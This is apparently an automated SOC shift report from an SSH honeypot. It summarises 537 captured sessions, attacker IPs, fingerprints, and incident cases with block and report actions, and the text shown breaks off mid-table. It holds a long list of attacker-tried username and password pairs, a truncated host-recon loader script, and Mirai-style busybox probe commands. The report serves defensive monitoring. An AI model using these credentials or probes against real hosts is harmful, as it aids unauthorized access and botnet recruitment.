# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-27 |
| **Generated At** | 2026-06-27T15:19:42Z |
| **Shift Time** | 15:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **537** |
| Confirmed Threats | **530** |
| False Positives Filtered | **7** (1.3%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **7** |
| High Severity Cases | **158** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **379** |
| Malware Samples Analyzed | **5** HIGH · **42** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **161** |
| Unique Credential Pairs | **156** |
| Unique Usernames | **78** |
| Unique Passwords | **141** |
| Successful Auth Pairs | **157** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 68 |
| `ubuntu` | 6 |
| `admin` | 5 |
| `23` | 3 |
| `dingy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 11 |
| `111111` | 4 |
| `admin` | 3 |
| `root` | 3 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 3 |
| `23` | `root` | 3 |
| `root` | `smo@@kkklss` | 2 |
| `root` | `7788414` | 1 |
| `th` | `th` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `7788414` | `209.99.185.59` | 2026-06-27T12:55:56 |
| `th` | `th` | `209.99.185.59` | 2026-06-27T12:56:49 |
| `root` | `passw0rd` | `91.92.40.13` | 2026-06-27T12:57:21 |
| `lyl` | `lyl` | `209.99.185.59` | 2026-06-27T12:57:42 |
| `root` | `P455w0rd` | `45.205.1.42` | 2026-06-27T12:58:11 |
| `john` | `john` | `209.99.185.59` | 2026-06-27T12:58:36 |
| `admin` | `admin` | `10.0.0.73` | 2026-06-27T12:59:30 |
| `root` | `Passwd12#$` | `209.99.185.59` | 2026-06-27T12:59:33 |
| `root` | `k9jt3d` | `209.99.185.59` | 2026-06-27T13:00:28 |
| `xm` | `xmxm136136` | `209.99.185.59` | 2026-06-27T13:01:24 |
| `root` | `TQEpd4WvHiMHVdmw` | `209.99.185.59` | 2026-06-27T13:02:21 |
| `loose` | `loose1234` | `209.99.185.59` | 2026-06-27T13:03:14 |
| `yanyx` | `yyx52208921` | `209.99.185.59` | 2026-06-27T13:04:08 |
| `ubuntu` | `!QAZ2wsx` | `45.198.224.120` | 2026-06-27T13:04:31 |
| `ws` | `ws` | `209.99.185.59` | 2026-06-27T13:05:03 |
| `samba` | `123456` | `209.99.185.59` | 2026-06-27T13:06:00 |
| `aoe` | `aoe123` | `209.99.185.59` | 2026-06-27T13:06:56 |
| `root` | `system` | `209.99.185.59` | 2026-06-27T13:07:53 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-27T13:08:37 |
| `root` | `123.123` | `209.99.185.59` | 2026-06-27T13:08:47 |
| `ksh` | `ksh` | `209.99.185.59` | 2026-06-27T13:09:40 |
| `cajas0` | `cajas0` | `209.99.185.59` | 2026-06-27T13:10:37 |
| `student2` | `111111` | `209.99.185.59` | 2026-06-27T13:11:35 |
| `localhost` | `Jay56` | `209.99.185.59` | 2026-06-27T13:12:31 |
| `root` | `Pa$$s0rd1234` | `45.205.1.42` | 2026-06-27T13:12:51 |
| `linchunli` | `linchunli1234` | `209.99.185.59` | 2026-06-27T13:13:28 |
| `guanhuihua` | `guanhuihua` | `209.99.185.59` | 2026-06-27T13:14:29 |
| `root` | `qwe-123` | `209.99.185.59` | 2026-06-27T13:15:28 |
| `root` | `qwer123.com` | `45.198.224.120` | 2026-06-27T13:16:16 |
| `sg` | `korea2010` | `209.99.185.59` | 2026-06-27T13:16:27 |
| `sc` | `123` | `209.99.185.59` | 2026-06-27T13:17:22 |
| `root` | `inbox` | `209.99.185.59` | 2026-06-27T13:18:20 |
| `ysy` | `123456` | `209.99.185.59` | 2026-06-27T13:19:18 |
| `omnisky` | `omnisky123` | `209.99.185.59` | 2026-06-27T13:20:16 |
| `bayarea` | `bayarea` | `209.99.185.59` | 2026-06-27T13:21:12 |
| `wilson` | `wilson` | `209.99.185.59` | 2026-06-27T13:22:08 |
| `root` | `P@ssw0rd12345` | `209.99.185.59` | 2026-06-27T13:23:04 |
| `root` | `12@ImpaxPVL` | `209.99.185.59` | 2026-06-27T13:24:02 |
| `ubuntu` | `1234admin` | `209.99.185.59` | 2026-06-27T13:25:01 |
| `root` | `user1234567890` | `209.99.185.59` | 2026-06-27T13:26:04 |
| `dingy` | `123456` | `209.99.185.59` | 2026-06-27T13:27:02 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-27T13:27:28 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-27T13:27:28 |
| `user` | `user@2020` | `45.205.1.42` | 2026-06-27T13:27:30 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-27T13:27:38 |
| `ubuntu` | `git123456789` | `45.198.224.120` | 2026-06-27T13:27:51 |
| `usuario` | `usuario321` | `209.99.185.59` | 2026-06-27T13:28:03 |
| `odoo` | `password` | `209.99.185.59` | 2026-06-27T13:29:06 |
| `wd` | `wd` | `209.99.185.59` | 2026-06-27T13:30:04 |
| `root` | `a1s2d3` | `209.99.185.59` | 2026-06-27T13:31:04 |
| `root` | `` | `141.11.88.100` | 2026-06-27T13:31:45 |
| `zjj` | `wyc0922..` | `209.99.185.59` | 2026-06-27T13:32:05 |
| `nx` | `nx111111` | `209.99.185.59` | 2026-06-27T13:33:06 |
| `root` | `q123456` | `209.99.185.59` | 2026-06-27T13:34:10 |
| `root` | `abc123456789` | `209.99.185.59` | 2026-06-27T13:35:15 |
| `mysql` | `654321` | `209.99.185.59` | 2026-06-27T13:36:19 |
| `root` | `JQdl2021+` | `209.99.185.59` | 2026-06-27T13:37:21 |
| `webserver` | `webserver` | `209.99.185.59` | 2026-06-27T13:38:28 |
| `yuanke` | `yuanke` | `45.198.224.120` | 2026-06-27T13:39:31 |
| `ywj` | `ywj` | `209.99.185.59` | 2026-06-27T13:39:32 |
| `haoyuan` | `haoyuan` | `209.99.185.59` | 2026-06-27T13:40:34 |
| `root` | `rastaman` | `209.99.185.59` | 2026-06-27T13:41:36 |
| `root` | `qazwsx12` | `45.205.1.42` | 2026-06-27T13:42:12 |
| `root` | `mysql` | `209.99.185.59` | 2026-06-27T13:42:38 |
| `test` | `0` | `209.99.185.59` | 2026-06-27T13:43:40 |
| `fa` | `fa` | `209.99.185.59` | 2026-06-27T13:44:44 |
| `ruth` | `123456` | `209.99.185.59` | 2026-06-27T13:45:47 |
| `wangjing` | `123456` | `209.99.185.59` | 2026-06-27T13:46:51 |
| `jianglinghan` | `jianglinghan` | `209.99.185.59` | 2026-06-27T13:47:55 |
| `root` | `admin111` | `209.99.185.59` | 2026-06-27T13:48:58 |
| `zhaoheng` | `zhaoheng` | `209.99.185.59` | 2026-06-27T13:50:01 |
| `ubuntu` | `123root` | `45.198.224.120` | 2026-06-27T13:51:02 |
| `node` | `1234` | `209.99.185.59` | 2026-06-27T13:51:05 |
| `ubuntu` | `developer1234567` | `209.99.185.59` | 2026-06-27T13:52:12 |
| `23` | `root` | `176.65.139.140` | 2026-06-27T13:53:24 |
| `vps` | `qwerty` | `209.99.185.59` | 2026-06-27T13:53:25 |
| `cgr` | `123456` | `209.99.185.59` | 2026-06-27T13:54:33 |
| `debian` | `123` | `209.99.185.59` | 2026-06-27T13:55:38 |
| `root` | `w3bm@st3r` | `209.99.185.59` | 2026-06-27T13:56:44 |
| `root` | `qWeRtYuIoP` | `45.205.1.42` | 2026-06-27T13:56:48 |
| `lvjialong` | `lvjialong` | `209.99.185.59` | 2026-06-27T13:57:50 |
| `root` | `toor1234` | `209.99.185.59` | 2026-06-27T13:58:59 |
| `r00t` | `r00t123` | `209.99.185.59` | 2026-06-27T14:00:10 |
| `root` | `pos` | `209.99.185.59` | 2026-06-27T14:01:00 |
| `root` | `Roam@#call` | `209.99.185.59` | 2026-06-27T14:01:47 |
| `vps` | `test` | `209.99.185.59` | 2026-06-27T14:02:33 |
| `user` | `resu` | `45.198.224.120` | 2026-06-27T14:02:39 |
| `root` | `SUgOn$WuzHeN!miX_2022%6+17\bJD` | `209.99.185.59` | 2026-06-27T14:03:19 |
| `root` | `joshua` | `209.99.185.59` | 2026-06-27T14:04:06 |
| `test01` | `test01` | `209.99.185.59` | 2026-06-27T14:04:52 |
| `root` | `P@ssw0rd.` | `209.99.185.59` | 2026-06-27T14:05:39 |
| `tempuser` | `12345678` | `209.99.185.59` | 2026-06-27T14:06:25 |
| `root` | `963852741` | `209.99.185.59` | 2026-06-27T14:07:11 |
| `root` | `a1s2d3f4` | `209.99.185.59` | 2026-06-27T14:07:57 |
| `zengke` | `zengke` | `209.99.185.59` | 2026-06-27T14:08:44 |
| `newadmin` | `newadmin` | `209.99.185.59` | 2026-06-27T14:09:32 |
| `lijuren` | `ljr123zjunet` | `209.99.185.59` | 2026-06-27T14:10:24 |
| `root` | `m1l1t@ry` | `209.99.185.59` | 2026-06-27T14:11:14 |
| `dongqishi` | `dongqishi` | `45.205.1.42` | 2026-06-27T14:11:34 |
| `root` | `recovery` | `209.99.185.59` | 2026-06-27T14:12:02 |
| `root` | `Aa195043` | `209.99.185.59` | 2026-06-27T14:12:50 |
| `peer` | `222222` | `209.99.185.59` | 2026-06-27T14:13:37 |
| `root` | `qishangzaixian` | `45.198.224.120` | 2026-06-27T14:14:20 |
| `root` | `10idc.com` | `209.99.185.59` | 2026-06-27T14:14:26 |
| `ghost` | `111111` | `209.99.185.59` | 2026-06-27T14:15:16 |
| `testing` | `changeme` | `209.99.185.59` | 2026-06-27T14:16:08 |
| `xqren` | `123456` | `209.99.185.59` | 2026-06-27T14:17:00 |
| `root` | `1234567a` | `209.99.185.59` | 2026-06-27T14:17:51 |
| `admin` | `admin` | `120.48.32.130` | 2026-06-27T14:18:41 |
| `root` | `Root@2020` | `209.99.185.59` | 2026-06-27T14:18:43 |
| `yuanwd` | `123qwe` | `209.99.185.59` | 2026-06-27T14:19:33 |
| `root` | `7ujm*IK,9ol.` | `209.99.185.59` | 2026-06-27T14:20:23 |
| `zm` | `zm123` | `209.99.185.59` | 2026-06-27T14:21:13 |
| `wenyu` | `123456` | `209.99.185.59` | 2026-06-27T14:22:04 |
| `root` | `P@ssw0rd123456` | `209.99.185.59` | 2026-06-27T14:22:55 |
| `zhangyc` | `zhangyc` | `209.99.185.59` | 2026-06-27T14:23:48 |
| `root` | `N3rd@2023` | `209.99.185.59` | 2026-06-27T14:24:42 |
| `pzhou` | `pzhou` | `209.99.185.59` | 2026-06-27T14:25:33 |
| `root` | `q1w2e3r4T5` | `45.198.224.120` | 2026-06-27T14:26:01 |
| `root` | `qwer2014` | `45.205.1.42` | 2026-06-27T14:26:17 |
| `songhaixing15` | `songhaixing15` | `209.99.185.59` | 2026-06-27T14:26:23 |
| `root` | `110110` | `209.99.185.59` | 2026-06-27T14:27:14 |
| `wangmaolin` | `1234` | `209.99.185.59` | 2026-06-27T14:28:04 |
| `admin1` | `111111` | `209.99.185.59` | 2026-06-27T14:28:55 |
| `root` | `zxcvbnm,./` | `209.99.185.59` | 2026-06-27T14:29:50 |
| `root` | `QAZ!@#$123` | `209.99.185.59` | 2026-06-27T14:30:44 |
| `mysql` | `wasd` | `209.99.185.59` | 2026-06-27T14:31:34 |
| `root` | `l@sv3g@s` | `209.99.185.59` | 2026-06-27T14:32:25 |
| `root` | `P@ssword123456789` | `209.99.185.59` | 2026-06-27T14:33:16 |
| `kmc` | `123456` | `209.99.185.59` | 2026-06-27T14:34:07 |
| `hjduan` | `wuERcjF1ZB` | `209.99.185.59` | 2026-06-27T14:34:59 |
| `wj` | `wj` | `209.99.185.59` | 2026-06-27T14:35:53 |
| `test` | `666666` | `209.99.185.59` | 2026-06-27T14:36:46 |
| `root` | `q1q1q1q1` | `209.99.185.59` | 2026-06-27T14:37:41 |
| `root` | `qweqwe` | `45.198.224.120` | 2026-06-27T14:37:58 |
| `root` | `qweasdQWE` | `209.99.185.59` | 2026-06-27T14:38:38 |
| `server` | `changeme123` | `209.99.185.59` | 2026-06-27T14:39:32 |
| `nobody` | `111111` | `209.99.185.59` | 2026-06-27T14:40:25 |
| `root` | `b6V5REhXw5` | `120.26.48.31` | 2026-06-27T14:40:40 |
| `root` | `qwe@123456` | `45.205.1.42` | 2026-06-27T14:40:58 |
| `ubuntu` | `1qaz2wsx3edc4rfv` | `209.99.185.59` | 2026-06-27T14:41:17 |
| `ying` | `ying` | `209.99.185.59` | 2026-06-27T14:42:10 |
| `root` | `q1w2e3r4t5` | `209.99.185.59` | 2026-06-27T14:43:03 |
| `root` | `jm` | `209.99.185.59` | 2026-06-27T14:43:58 |
| `ceshi3` | `ceshi3321` | `209.99.185.59` | 2026-06-27T14:44:54 |
| `root` | `quiet` | `209.99.185.59` | 2026-06-27T14:45:47 |
| `root` | `guest1` | `209.99.185.59` | 2026-06-27T14:46:40 |
| `yqiao` | `@fudan2021` | `209.99.185.59` | 2026-06-27T14:47:33 |
| `fanslau` | `123456` | `209.99.185.59` | 2026-06-27T14:48:27 |
| `a` | `123456` | `209.99.185.59` | 2026-06-27T14:49:22 |
| `root` | `uploader` | `45.198.224.120` | 2026-06-27T14:49:24 |
| `postgres` | `postgres@123` | `209.99.185.59` | 2026-06-27T14:50:15 |
| `root` | `~!@` | `209.99.185.59` | 2026-06-27T14:51:08 |
| `admin` | `Admin@95173` | `209.99.185.59` | 2026-06-27T14:52:02 |
| `root` | `1234567899` | `209.99.185.59` | 2026-06-27T14:52:56 |
| `dingy` | `1q2w3e` | `209.99.185.59` | 2026-06-27T14:53:50 |
| `admin` | `123qaz` | `209.99.185.59` | 2026-06-27T14:54:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **537** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 149 |
| libssh | 5 |
| Paramiko (Python) | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 147 | 3 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 147 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 1 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
Source IPs: `91.92.40.13`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `141.11.88.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **15** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | MEDIUM |
| `AS213702` | QWINS LTD | 1 | MEDIUM |
| `AS49981` | WorldStream B.V. | 1 | HIGH |
| `AS402253` | SKN Subnet & Telecom Ltd | 1 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (157)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-598b0087e006

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:55 |
| **Last Seen** | 2026-06-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:55:56` | `cowrie.session.connect` |
| `2026-06-27 12:55:56` | `cowrie.client.version` |
| `2026-06-27 12:55:56` | `cowrie.client.kex` |
| `2026-06-27 12:55:56` | `cowrie.login.success` |
| `2026-06-27 12:55:57` | `cowrie.session.params` |
| `2026-06-27 12:55:57` | `cowrie.command.input` |
| `2026-06-27 12:55:57` | `cowrie.log.closed` |
| `2026-06-27 12:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941eb1b1bfb1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:56 |
| **Last Seen** | 2026-06-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:56:49` | `cowrie.session.connect` |
| `2026-06-27 12:56:49` | `cowrie.client.version` |
| `2026-06-27 12:56:49` | `cowrie.client.kex` |
| `2026-06-27 12:56:49` | `cowrie.login.success` |
| `2026-06-27 12:56:50` | `cowrie.session.params` |
| `2026-06-27 12:56:50` | `cowrie.command.input` |
| `2026-06-27 12:56:50` | `cowrie.log.closed` |
| `2026-06-27 12:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42bb0ab4dc8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:57 |
| **Last Seen** | 2026-06-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:57:21` | `cowrie.session.connect` |
| `2026-06-27 12:57:21` | `cowrie.client.version` |
| `2026-06-27 12:57:21` | `cowrie.client.kex` |
| `2026-06-27 12:57:21` | `cowrie.login.success` |
| `2026-06-27 12:57:22` | `cowrie.session.params` |
| `2026-06-27 12:57:22` | `cowrie.command.input` |
| `2026-06-27 12:57:22` | `cowrie.command.input` |
| `2026-06-27 12:57:22` | `cowrie.command.input` |
| `2026-06-27 12:57:22` | `cowrie.command.input` |
| `2026-06-27 12:57:22` | `cowrie.log.closed` |
| `2026-06-27 12:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b164228999cb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:57 |
| **Last Seen** | 2026-06-27 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:57:41` | `cowrie.session.connect` |
| `2026-06-27 12:57:41` | `cowrie.client.version` |
| `2026-06-27 12:57:41` | `cowrie.client.kex` |
| `2026-06-27 12:57:42` | `cowrie.login.success` |
| `2026-06-27 12:57:42` | `cowrie.session.params` |
| `2026-06-27 12:57:42` | `cowrie.command.input` |
| `2026-06-27 12:57:42` | `cowrie.log.closed` |
| `2026-06-27 12:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4a6d18038b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 12:58 |
| **Last Seen** | 2026-06-27 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:58:08` | `cowrie.session.connect` |
| `2026-06-27 12:58:09` | `cowrie.client.version` |
| `2026-06-27 12:58:09` | `cowrie.client.kex` |
| `2026-06-27 12:58:11` | `cowrie.login.success` |
| `2026-06-27 12:58:13` | `cowrie.session.params` |
| `2026-06-27 12:58:13` | `cowrie.command.input` |
| `2026-06-27 12:58:13` | `cowrie.log.closed` |
| `2026-06-27 12:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfde74c535d0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:58 |
| **Last Seen** | 2026-06-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:58:36` | `cowrie.session.connect` |
| `2026-06-27 12:58:36` | `cowrie.client.version` |
| `2026-06-27 12:58:36` | `cowrie.client.kex` |
| `2026-06-27 12:58:36` | `cowrie.login.success` |
| `2026-06-27 12:58:37` | `cowrie.session.params` |
| `2026-06-27 12:58:37` | `cowrie.command.input` |
| `2026-06-27 12:58:37` | `cowrie.log.closed` |
| `2026-06-27 12:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda86a270019

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:59 |
| **Last Seen** | 2026-06-27 12:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:59:32` | `cowrie.session.connect` |
| `2026-06-27 12:59:32` | `cowrie.client.version` |
| `2026-06-27 12:59:32` | `cowrie.client.kex` |
| `2026-06-27 12:59:33` | `cowrie.login.success` |
| `2026-06-27 12:59:33` | `cowrie.session.params` |
| `2026-06-27 12:59:33` | `cowrie.command.input` |
| `2026-06-27 12:59:34` | `cowrie.log.closed` |
| `2026-06-27 12:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13f1f1c5d59

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:00 |
| **Last Seen** | 2026-06-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:00:28` | `cowrie.session.connect` |
| `2026-06-27 13:00:28` | `cowrie.client.version` |
| `2026-06-27 13:00:28` | `cowrie.client.kex` |
| `2026-06-27 13:00:28` | `cowrie.login.success` |
| `2026-06-27 13:00:29` | `cowrie.session.params` |
| `2026-06-27 13:00:29` | `cowrie.command.input` |
| `2026-06-27 13:00:29` | `cowrie.log.closed` |
| `2026-06-27 13:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c7ce410f78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:01 |
| **Last Seen** | 2026-06-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:01:24` | `cowrie.session.connect` |
| `2026-06-27 13:01:24` | `cowrie.client.version` |
| `2026-06-27 13:01:24` | `cowrie.client.kex` |
| `2026-06-27 13:01:24` | `cowrie.login.success` |
| `2026-06-27 13:01:25` | `cowrie.session.params` |
| `2026-06-27 13:01:25` | `cowrie.command.input` |
| `2026-06-27 13:01:25` | `cowrie.log.closed` |
| `2026-06-27 13:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c9e3a353a8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:02 |
| **Last Seen** | 2026-06-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
